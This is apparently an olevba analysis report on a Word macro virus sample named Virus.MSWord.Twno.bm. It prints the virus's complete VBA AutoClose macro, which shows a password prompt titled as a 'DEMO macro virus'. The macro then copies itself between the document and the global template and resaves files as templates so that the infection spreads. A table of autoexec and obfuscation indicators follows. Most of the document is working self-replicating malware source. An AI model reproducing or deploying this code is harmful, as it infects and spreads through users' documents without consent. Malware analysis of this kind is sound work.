olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twno.bm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twno.bm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Twno.bm - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim ansy$
Dim nor
Dim ff
Dim t
Dim file$
Dim filem$
Dim nor1
Dim kk
Dim tt

    
err:
    ansy$ = InputBox$("你知道我是誰嗎!!", "DEMO巨集病毒1.3版 ")
    If ansy$ = "wergelis" Then GoTo p1 Else GoTo p2
    'End If
 
p1:
    WordBasic.MsgBox "Ok!!", "DEMO巨集病毒1.3版", 64
    GoTo e1
p2:
    WordBasic.MsgBox "Error!!", "DEMO巨集病毒1.3版", 16
    nor = WordBasic.CountMacros(0)
    If nor > 0 Then
       For ff = 1 To nor
         If WordBasic.[MacroName$](ff, 0) = "AutoClose" Then
            t = 1
           End If
        Next ff
    End If
  
    file$ = WordBasic.[filename$]()
    filem$ = file$ + ":AutoClose"
    If t <> 1 Then
        WordBasic.[MacroCopy] filem$, "AutoClose"
        'WordBasic.[MacroCopy] filem$, "AutoNew"
    End If
    nor1 = WordBasic.CountMacros(1)
If nor1 > 0 Then
   For kk = 1 To nor1
     If WordBasic.[MacroName$](kk, 1) = "AutoClose" Then
        tt = 1
     End If
   Next kk
End If
If tt <> 1 Then
   WordBasic.FileSaveAs Format:=1
   WordBasic.[MacroCopy] "AutoClose", filem$
End If
 
e1:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

